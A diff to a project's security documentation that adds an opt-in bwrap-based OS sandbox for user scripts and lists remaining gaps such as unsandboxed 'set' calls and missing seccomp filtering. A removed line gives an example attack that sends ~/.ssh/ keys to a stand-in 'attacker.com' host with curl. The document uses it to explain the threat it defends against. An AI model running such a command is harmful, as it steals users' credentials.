@@ -53,7 +53,8 @@ safe. v1.0 deliberately omits them.
 |---|---|---|---|---|---|
 | **`blankScript:` carve-out** (scripts can't ship via registry) | ✓ | ✓ | ✓ | ✓ | `spec/blank-spec.md` |
 | **Path sandbox** — refuse `blankScript:` resolving outside CUES roots, realpath-based to defeat symlinks | ✓ | ✓ | ✓ | ✓ | `packages/opencues-runtime/src/security/spawn-sandbox.ts` |
-| **Audit log** — append every script invocation to `<root>/.opencues-log` (timestamp, host, command, args, exit, ms) | ✓ | ✓ | ✓ | ✓ | same module |
+| **OS-level sandbox** (opt-in via `sandbox: strict`) — read-only FS outside `/tmp`, no network by default, isolated PID/IPC namespaces. bwrap-based on Linux/WSL. | ✓ | ✓ | ✓ | ✓ | `packages/opencues-runtime/src/security/sandbox-runner.ts` + `docs/architecture/sandbox.md` |
+| **Audit log** — append every script invocation to `<root>/.opencues-log` (timestamp, host, command, args, exit, ms) | ✓ | ✓ | ✓ | ✓ | `spawn-sandbox.ts` |
 | **Env-key whitelist** — only `CUES_*` env vars from a script spec reach the spawned process | — | — | — | ✓ | `integrations/chrome/host/host.cjs` |
 | **Endpoint validation** — flag custom LLM endpoints at `opencues validate` (error on unknown provider / invalid URL; warn on stock-override) | ✓ | ✓ | ✓ | ✓ | `packages/opencues-core/src/llm-provider.ts:validateEndpoint` |
 | **Runtime endpoint warning** — log once per `(provider, endpoint)` when a custom URL is resolved | ✓ | ✓ | ✓ | ✓ | `resolveLLM` in same module |
@@ -111,12 +112,21 @@ Detailed per-area:
 
 The spec's "future revision" commitment captures these:
 
-- **Sandboxed script execution.** v1.0 runs scripts with full user
-  permissions; a `curl ~/.ssh/ attacker.com` blanket-script would
-  succeed. A future v1.x MAY introduce a constrained runtime (no
-  network / no fs outside CUES roots) for blanks that don't need
-  shell power. Path sandbox alone doesn't help — the content inside
-  the script is still arbitrary.
+- **Default-on sandbox.** The OS-level sandbox shipped as opt-in:
+  blanks declare `sandbox: strict` to receive it. Existing shipped
+  blanks (volume, brightness) need `/mnt/c/` filesystem access for
+  Windows-side binaries (`VolCtl.exe`) and won't run inside the
+  sandbox until they declare those permissions explicitly. Migration
+  plan: audit each default blank, attach `sandbox: strict` or
+  `sandbox: off` with rationale, then flip the runtime default.
+- **Syscall-level confinement.** The bwrap sandbox is filesystem-
+  and namespace-shaped, not syscall-shaped. A future revision could
+  layer `--seccomp <fd>` to block `ptrace`, `chroot`, `mount`, etc.
+- **Sandbox cycling (`set` calls).** Today only the blank-fill
+  `get` path applies the sandbox. Cycling Up/Down on a sandboxed
+  blank fires `set <value>` unsandboxed. Plumbing the sandbox config
+  through `cycling.ts`'s `invokeOrSpawn` helper closes this; tracked
+  as follow-up.
 - **Cryptographic provenance for cue packs.** Once a registry
   exists, `opencues add <pack>` should verify a signature against
   the publisher's manifest. Today's distribution model is "publish
